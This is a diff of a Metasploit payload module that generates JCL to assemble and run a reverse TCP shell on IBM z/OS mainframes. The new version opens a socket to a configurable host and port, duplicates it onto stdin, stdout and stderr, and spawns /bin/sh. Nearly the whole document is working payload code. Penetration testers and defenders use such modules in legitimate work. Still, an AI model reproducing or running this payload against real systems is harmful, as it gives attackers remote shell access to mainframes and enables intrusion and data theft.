@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 # This payload has no ebcdic<->ascii translator built in.
 # Therefore it must use a shell which does, like mainframe_shell
@@ -8,13 +8,12 @@
 #  on the system as JCL to JES2
 ##
 
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/mainframe_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-  CachedSize = 9048
+  CachedSize = 8993
   include Msf::Payload::Single
   include Msf::Payload::Mainframe
   include Msf::Sessions::CommandShellOptions
@@ -23,7 +22,7 @@ module MetasploitModule
     super(merge_info(info,
                      'Name'          => 'Z/OS (MVS) Command Shell, Reverse TCP',
                      'Description'   => 'Provide JCL which creates a reverse shell
-                       This implmentation does not include ebcdic character translation,
+                       This implementation does not include ebcdic character translation,
                        so a client with translation capabilities is required.  MSF handles
                        this automatically.',
                      'Author'        => 'Bigendian Smalls',
@@ -42,7 +41,7 @@ module MetasploitModule
     register_options(
       [
         # need these defaulted so we can manipulate them in command_string
-        Opt::LHOST('127.0.0.1'),
+        Opt::LHOST('0.0.0.0'),
         Opt::LPORT(4444),
         OptString.new('ACTNUM', [true, "Accounting info for JCL JOB card", "MSFUSER-ACCTING-INFO"]),
         OptString.new('PGMNAME', [true, "Programmer name for JCL JOB card", "programmer name"]),
@@ -82,187 +81,208 @@ module MetasploitModule
 
     jcl_jobcard +
       "//**************************************/\n" \
-      "//* Generates reverse shell            */\n" \
+      "//*  SPAWN REVERSE SHELL FOR MSF MODULE*/\n" \
       "//**************************************/\n" \
       "//*\n" \
-      "//STEP1     EXEC PROC=ASMACLG\n" \
-      "//SYSPRINT  DD  SYSOUT=*,HOLD=YES\n" \
-      "//SYSIN     DD  *,DLM=ZZ\n" \
-      "         TITLE  'z/os Reverse Shell'\n" \
-      "NEWREV   CSECT\n" \
-      "NEWREV   AMODE 31\n" \
-      "NEWREV   RMODE 31\n" \
+      "//STEP1      EXEC PROC=ASMACLG,PARM.L=(CALL)\n" \
+      "//L.SYSLIB   DD  DSN=SYS1.CSSLIB,DISP=SHR\n" \
+      "//C.SYSIN    DD  *,DLM=ZZ\n" \
+      "         TITLE  'Spanws Reverse Shell'\n" \
+      "SPAWNREV CSECT\n" \
+      "SPAWNREV AMODE 31\n" \
+      "SPAWNREV RMODE ANY\n" \
       "***********************************************************************\n" \
-      "*         SETUP registers and save areas                              *\n" \
+      "*        @SETUP registers and save areas                              *\n" \
       "***********************************************************************\n" \
-      "MAIN     LR    7,15            # R7 is base register\n" \
-      "         NILH  7,X'1FFF'       # ensure local address\n" \
-      "         USING MAIN,0          # R8 for addressability\n" \
-      "         DS    0H              # halfword boundaries\n" \
-      "         LA    1,ZEROES(7)     # address byond which should be all 0s\n" \
-      "         XC    0(204,1),0(1)   # clear zero area\n" \
-      "         LA    13,SAVEAREA(7)  # address of save area\n" \
-      "         LHI   8,8             # R8 has static 8\n" \
-      "         LHI   9,1             # R9 has static 1\n" \
-      "         LHI   10,2            # R10 has static 2\n" \
+      "         USING *,15\n" \
+      "@SETUP0  B     @SETUP1\n" \
+      "         DROP  15\n" \
+      "         DS    0H                 # half word boundary\n" \
+      "@SETUP1  STM   14,12,12(13)       # save our registers\n" \
+      "         LR    2,13               # callers sa\n" \
+      "         LR    8,15               # pgm base in R8\n" \
+      "         USING @SETUP0,8          # R8 for base addressability\n" \
+      "*************************************\n" \
+      "* set up data area / addressability *\n" \
+      "*************************************\n" \
+      "         L     0,@DYNSIZE         # len of variable area\n" \
+      "         GETMAIN RU,LV=(0)        # get data stg, len R0\n" \
+      "         LR    13,1               # data address\n" \
+      "         USING @DATA,13           # addressability for data area\n" \
+      "         ST    2,@BACK            # store callers sa address\n" \
+      "         ST    13,8(,2)           # store our data addr\n" \
+      "         DS    0H                 # halfword boundaries\n" \
       "\n" \
       "***********************************************************************\n" \
-      "*        BPX1SOC set up socket                                        *\n" \
+      "*        BPX1SOC set up socket - inline                               *\n" \
       "***********************************************************************\n" \
-      "BSOC     LA    0,@@F1(7)       # USS callable svcs socket\n" \
-      "         LA    3,8             # n parms\n" \
-      "         LA    5,DOM(7)        # Relative addr of First parm\n" \
-      "         ST    10,DOM(7)       # store a 2 for AF_INET\n" \
-      "         ST     9,TYPE(7)      # store a 1 for sock_stream\n" \
-      "         ST     9,DIM(7)       # store a 1 for dim_sock\n" \
-      "         LA    15,CLORUN(7)    # address of generic load & run\n" \
-      "         BASR  14,15           # Branch to load & run\n" \
+      "         CALL  BPX1SOC,                                                X\n" \
+      "               (DOM,TYPE,PROTO,DIM,CLIFD,                              X\n" \
+      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
+      "\n" \
+      "*******************************\n" \
+      "*  chk return code, 0 or exit *\n" \
+      "*******************************\n" \
+      "         LHI   15,2\n" \
+      "         L     7,RTN_VAL\n" \
+      "         CIB   7,0,7,EXITP        # R7 not 0? Time to exit\n" \
       "\n" \
       "***********************************************************************\n" \
-      "*        BPX1CON (connect) connect to rmt host                        *\n" \
+      "*        BPX1CON (connect) connect to remote host - inline            *\n" \
       "***********************************************************************\n" \
-      "BCON     L     5,CLIFD(7)      # address of client file descriptor\n" \
-      "         ST    5,CLIFD2(7)     # store for connection call\n" \
-      "***  main processing **\n" \
-      "         LA    1,SSTR(7)       # packed socket string\n" \
-      "         LA    5,CLIFD2(7)     # dest for our sock str\n" \
-      "         MVC   7(9,5),0(1)     # mv packed skt str to parm array\n" \
-      "         LA    0,@@F2(7)       # USS callable svcs connect\n" \
-      "         LA    3,6             # n parms for func call\n" \
-      "         LA    5,CLIFD2(7)     # src parm list addr\n" \
-      "         LA    15,CLORUN(7)    # address of generic load & run\n" \
-      "         BASR  14,15           # Branch to load & run\n" \
+      "         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct\n" \
+      "         MVI   SOCK_FAMILY,AF_INET          # family inet\n" \
+      "         MVI   SOCK_LEN,SOCK#LEN            # len of socket\n" \
+      "         MVC   SOCK_SIN_PORT,CONNSOCK       # port to connect to\n" \
+      "         MVC   SOCK_SIN_ADDR,CONNADDR       # address to connect to\n" \
+      "         CALL  BPX1CON,                                                X\n" \
+      "               (CLIFD,SOCKLEN,SOCKADDR,                                X\n" \
+      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
+      "*******************************\n" \
+      "*  chk return code, 0 or exit *\n" \
+      "*******************************\n" \
+      "         LHI   15,3\n" \
+      "         L     7,RTN_VAL\n" \
+      "         CIB   7,0,7,EXITP        # R7 not 0? Time to exit\n" \
       "\n" \
       "*************************************************\n" \
-      "* Preparte the child pid we'll spawn            *\n" \
+      "* order of things to prep child pid             *\n" \
       "*  0) Dupe all 3 file desc of CLIFD             *\n" \
       "*  1) dupe parent read fd to std input          *\n" \
       "*************************************************\n" \
-      "         LHI   11,2            # Loop Counter R11=2\n" \
-      "@LOOP1   BRC   15,LFCNTL       # call FCNTL for each FD(in,out,err)\n" \
-      "@RET1    AHI   11,-1           # Decrement R11\n" \
-      "         CIJ   11,-1,7,@LOOP1  # if R11 >= 0, loop\n" \
+      "*******************\n" \
+      "*****  STDIN  *****\n" \
+      "*******************\n" \
+      "         CALL  BPX1FCT,                                                X\n" \
+      "               (CLIFD,                                                 X\n" \
+      "               =A(F_DUPFD2),                                           X\n" \
+      "               =A(F_STDI),                                             X\n" \
+      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
+      "****************************************************\n" \
+      "*  chk return code here anything but -1 is ok      *\n" \
+      "****************************************************\n" \
+      "         LHI   15,4               # exit code for this func\n" \
+      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
+      "         CIB   7,-1,8,EXITP       # R7 = -1 exit\n" \
+      "\n" \
+      "*******************\n" \
+      "*****  STDOUT *****\n" \
+      "*******************\n" \
+      "         CALL  BPX1FCT,                                                X\n" \
+      "               (CLIFD,                                                 X\n" \
+      "               =A(F_DUPFD2),                                           X\n" \
+      "               =A(F_STDO),                                             X\n" \
+      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
+      "****************************************************\n" \
+      "*  chk return code here anything but -1 is ok      *\n" \
+      "****************************************************\n" \
+      "         LHI   15,5               # exit code for this func\n" \
+      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
+      "         CIB   7,-1,8,EXITP       # R7 = -1 exit\n" \
+      "\n" \
+      "*******************\n" \
+      "*****  STDERR *****\n" \
+      "*******************\n" \
+      "         CALL  BPX1FCT,                                                X\n" \
+      "               (CLIFD,                                                 X\n" \
+      "               =A(F_DUPFD2),                                           X\n" \
+      "               =A(F_STDE),                                             X\n" \
+      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
+      "****************************************************\n" \
+      "*  chk return code here anything but -1 is ok      *\n" \
+      "****************************************************\n" \
+      "         LHI   15,6               # exit code for this func\n" \
+      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
+      "         CIB   7,-1,8,EXITP       # R7 = -1 exit\n" \
       "\n" \
       "***********************************************************************\n" \
-      "*        BPX1EXC (exec) execute /bin/sh                               *\n" \
+      "*        BP1SPN (SPAWN) execute shell '/bin/sh'                       *\n" \
       "***********************************************************************\n" \
-      "LEXEC    LA    1,EXCPRM1(7)    # top of arg list\n" \
-      "******************************************\n" \
-      "****  load array of addr and constants ***\n" \
-      "******************************************\n" \
-      "         ST    10,EXARG1L(7)   # arg 1 len is 2\n" \
-      "         LA    2,EXARG1L(7)    # addr of len of arg1\n" \
-      "         ST    2,16(0,1)       # arg4 Addr of Arg Len Addrs\n" \
-      "         LA    2,EXARG1(7)     # addr of arg1\n" \
-      "         ST    2,20(0,1)       # arg5 Addr of Arg Addrs\n" \
-      "         ST    9,EXARGC(7)     # store 1 in ARG Count\n" \
-      "**************************************************************\n" \
-      "*** call the exec function the normal way ********************\n" \
-      "**************************************************************\n" \
-      "         LA    0,@@EX1(7)      # USS callable svcs EXEC\n" \
-      "         LA    3,13            # n parms\n" \
-      "         LA    5,EXCPRM1(7)    # src parm list addr\n" \
-      "         LA    15,CLORUN(7)    # address of generic load & run\n" \
-      "         BASR  14,15           # Branch to load & run\n" \
+      "         XC    INHE(INHE#LENGTH),INHE   # clear inhe structure\n" \
+      "         XI    INHEFLAGS0,INHESETPGROUP\n" \
+      "         SPACE ,\n" \
+      "         MVC   INHEEYE,=C'INHE'\n" \
+      "         LH    0,TLEN\n" \
+      "         STH   0,INHELENGTH\n" \
+      "         LH    0,TVER\n" \
+      "         STH   0,INHEVERSION\n" \
+      "         CALL  BPX1SPN,                                                X\n" \
+      "               (EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,EXENVC,EXENVLL,     X\n" \
+      "               EXENVL,FDCNT,FDLST,=A(INHE#LENGTH),INHE,RTN_VAL,        X\n" \
+      "               RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
+      "         LHI   15,7               # exit code for this func\n" \
+      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
+      "         CIB   7,-1,8,EXITP       # R7 = -1 exit\n" \
       "\n" \
-      "***********************************************************************\n" \
-      "*** BPX1FCT (fnctl) Edit our file descriptor **************************\n" \
-      "***********************************************************************\n" \
-      "LFCNTL   LA    0,@@FC1(7)      # USS callable svcs FNCTL\n" \
-      "         ST    8,@ACT(7)       # 8 is our dupe2 action\n" \
-      "         L     5,CLIFD(7)      # client file descriptor\n" \
-      "         ST    5,@FFD(7)       # store as fnctl argument\n" \
-      "         ST    11,@ARG(7)      # fd to clone\n" \
-      "         LA    3,6             # n parms\n" \
-      "         LA    5,@FFD(7)       # src parm list addr\n" \
-      "         LA    15,CLORUN(7)    # address of generic load & run\n" \
-        "         BASR  14,15           # Branch to load & run\n" \
-        "         BRC   15,@RET1        # Return to caller\n" \
-        "\n" \
-        "***********************************************************************\n" \
-        "*  LOAD and run R0=func name, R3=n parms                              *\n" \
-        "*     R5 = src parm list                                              *\n" \
-        "***********************************************************************\n" \
-        "CLORUN   ST    14,8(,13)       # store ret address\n" \
-        "         XR    1,1             # zero R1\n" \
-        "         SVC   8               # get func call addr for R0\n" \
-        "         ST    0,12(13)        # Store returned addr in our SA\n" \
-        "         L     15,12(13)       # Load func addr into R15\n" \
-        "         LHI   6,20            # offset from SA of first parm\n" \
-        "         LA    1,0(6,13)       # start of dest parm list\n" \
-        "@LOOP2   ST    5,0(6,13)       # store parms address in parm\n" \
-        "         AHI   3,-1            # decrement # parm\n" \
-        "         CIJ   3,11,8,@FIX     #  haky fix for EXEC func\n" \
-        "@RETX    AHI   6,4             # increment dest parm addr\n" \
-        "         AHI   5,4             # increment src parm addr\n" \
-        "         CIJ   3,0,7,@LOOP2    # loop until R3 = 0\n" \
-        "         LA    5,0(6,13)\n" \
-        "         AHI   5,-4\n" \
-        "         OI    0(5),X'80'      # last parm first bit high\n" \
-        "@FIN1    BALR  14,15           # call function\n" \
-        "         L     14,8(,13)       # set up return address\n" \
-        "         BCR   15,14           # return to caller\n" \
-        "@FIX     AHI    5,4            # need extra byte skipped for exec\n" \
-        "         BRC   15,@RETX\n" \
-        "\n" \
-        "***********************************************************************\n" \
-        "*        Arg Arrays, Constants and Save Area                          *\n" \
-        "***********************************************************************\n" \
-        "         DS    0F\n" \
-        "*************************\n" \
-        "****  Func Names     ****\n" \
-        "*************************\n" \
-        "@@F1     DC    CL8'BPX1SOC '\n" \
-        "@@F2     DC    CL8'BPX1CON '\n" \
-        "@@EX1    DC    CL8'BPX1EXC '   # callable svcs name\n" \
-        "@@FC1    DC    CL8'BPX1FCT '\n" \
-        "*        # BPX1EXC Constants\n" \
-        "EXARG1   DC    CL2'sh'         # arg 1 to exec\n" \
-        "*        # BPX1CON Constants\n" \
-        "SSTR     DC    X'100202#{lport}#{lhost}'\n" \
-        "*        # BPX1EXC Arguments\n" \
-        "EXCPRM1  DS    0F              # actual parm list of exec call\n" \
-        "EXCMDL   DC    F'7'            # len of cmd to exec\n" \
-        "EXCMD    DC    CL7'/bin/sh'    # command to exec\n" \
-        "*********************************************************************\n" \
-        "******* Below this line is filled in runtime, but at compile ********\n" \
-        "******* is all zeroes, so it can be dropped from the shell- *********\n" \
-        "******* code as it will be dynamically added back and the ***********\n" \
-        "******* offsets are already calulated in the code *******************\n" \
-        "*********************************************************************\n" \
-        "ZEROES   DS    0F              # 51 4 byte slots\n" \
-        "EXARGC   DC    F'0'            # num of arguments\n" \
-        "EXARGS   DC    10XL4'00000000' # reminaing exec args\n" \
-        "EXARG1L  DC    F'0'            # arg1 length\n" \
-        "*        # BPX1FCT Arguments\n" \
-        "@FFD     DC    F'0'            # file descriptor\n" \
-        "@ACT     DC    F'0'            # fnctl action\n" \
-        "@ARG     DC    F'0'            # argument to fnctl\n" \
-        "@RETFD   DC    F'0'            # fd return\n" \
-        "FR1      DC    F'0'            # rtn code\n" \
-        "FR2      DC    F'0'            # rsn code\n" \
-        "*        # BPX1SOC Arguments\n" \
-        "DOM      DC    F'0'            # AF_INET = 2\n" \
-        "TYPE     DC    F'0'            # sock stream = 1\n" \
-        "PROTO    DC    F'0'            # protocol ip = 0\n" \
-        "DIM      DC    F'0'            # dim_sock = 1\n" \
-        "CLIFD    DC    F'0'            # client file descriptor\n" \
-        "SR1      DC    F'0'            # rtn val\n" \
-        "SR2      DC    F'0'            # rtn code\n" \
-        "SR3      DC    F'0'            # rsn code\n" \
-        "*        # BPX1CON Arguments\n" \
-        "CLIFD2   DC    F'0'            # CLIFD\n" \
-        "SOCKLEN  DC    F'0'            # length of Sock Struct\n" \
-        "SRVSKT   DC    XL2'0000'       # srv socket struct\n" \
-        "         DC    XL2'0000'       # port\n" \
-        "         DC    XL4'00000000'   # RHOST 0.0.0.0\n" \
-        "CR1      DC    F'0'            # rtn val\n" \
-        "CR2      DC    F'0'            # rtn code\n" \
-        "CR3      DC    F'0'            # rsn code\n" \
-        "SAVEAREA DC    18XL4'00000000' # save area for pgm mgmt\n" \
-        "EOFMARK  DC    X'deadbeef'     # eopgm marker for shellcode\n" \
-        "         END   MAIN\n" \
-        "ZZ\n" \
-        "//*\n"
+      "****************************************************\n" \
+      "* cleanup & exit preload R15 with exit code        *\n" \
+      "****************************************************\n" \
+      "         XR    15,15              # 4 FOR rc\n" \
+      "EXITP    L     0,@DYNSIZE\n" \
+      "         LR    1,13\n" \
+      "         L     13,@BACK\n" \
+      "         DROP  13\n" \
+      "         FREEMAIN RU,LV=(0),A=(1) # Free storage\n" \
+      "         L     14,12(,13)         # load R14\n" \
+      "         LM    0,12,20(13)        # load 0-12\n" \
+      "         BSM   0,14               # branch to caller\n" \
+      "\n" \
+      "****************************************************\n" \
+      "* Constants and Variables                          *\n" \
+      "****************************************************\n" \
+      "         DS    0F                 # constants full word boundary\n" \
+      "F_STDI   EQU   0\n" \
+      "F_STDO   EQU   1\n" \
+      "F_STDE   EQU   2\n" \
+      "*************************\n" \
+      "* Socket conn variables *         # functions used by pgm\n" \
+      "*************************\n" \
+      "CONNSOCK DC    XL2'#{lport}'    # LPORT\n" \
+      "CONNADDR DC    XL4'#{lhost}'    # LHOST\n" \
+      "DOM      DC    A(AF_INET)         # AF_INET = 2\n" \
+      "TYPE     DC    A(SOCK#_STREAM)    # stream = 1\n" \
+      "PROTO    DC    A(IPPROTO_IP)      # ip = 0\n" \
+      "DIM      DC    A(SOCK#DIM_SOCKET) # dim_sock = 1\n" \
+      "SOCKLEN  DC    A(SOCK#LEN+SOCK_SIN#LEN)\n" \
+      "************************\n" \
+      "* BPX1SPN vars *********\n" \
+      "************************\n" \
+      "EXCMD    DC    CL7'/bin/sh'       # command to exec\n" \
+      "EXCMDL   DC    A(L'EXCMD)         # len of cmd to exec\n" \
+      "EXARGC   DC    F'1'               # num of arguments\n" \
+      "EXARG1   DC    CL2'sh'            # arg 1 to exec\n" \
+      "EXARG1L  DC    A(L'EXARG1)        # len of arg1\n" \
+      "EXARGL   DC    A(EXARG1)          # addr of argument list\n" \
+      "EXARGLL  DC    A(EXARG1L)         # addr of arg len list\n" \
+      "EXENVC   DC    F'0'               # env var count\n" \
+      "EXENVL   DC    F'0'               # env var arg list addr\n" \
+      "EXENVLL  DC    F'0'               # env var arg len addr\n" \
+      "FDCNT    DC    F'0'               # field count s/b 0\n" \
+      "FDLST    DC    F'0'               # field list addr s/b 0\n" \
+      "TVER     DC    AL2(INHE#VER)\n" \
+      "TLEN     DC    AL2(INHE#LENGTH)\n" \
+      "         SPACE ,\n" \
+      "@DYNSIZE DC    A(@ENDYN-@DATA)\n" \
+      "***************************\n" \
+      "***** end of constants ****\n" \
+      "***************************\n" \
+      "@DATA    DSECT ,\n" \
+      "         DS    0D\n" \
+      "PLIST    DS    16A\n" \
+      "RTN_VAL  DS    F                  # return value\n" \
+      "RTN_COD  DS    F                  # return code\n" \
+      "RSN_COD  DS    F                  # reason code\n" \
+      "CLIFD    DS    F                  # client fd\n" \
+      "@BACK    DS    A\n" \
+      "*\n" \
+      "         BPXYSOCK   LIST=NO,DSECT=NO\n" \
+      "         BPXYFCTL   LIST=NO,DSECT=NO\n" \
+      "         BPXYINHE   LIST=NO,DSECT=NO\n" \
+      "@ENDYN   EQU   *\n" \
+      "@DATA#LEN EQU  *-@DATA\n" \
+      "         BPXYCONS   LIST=NO\n" \
+      "         END   SPAWNREV\n" \
+      "ZZ\n" \
+      "//*\n"
   end
 end
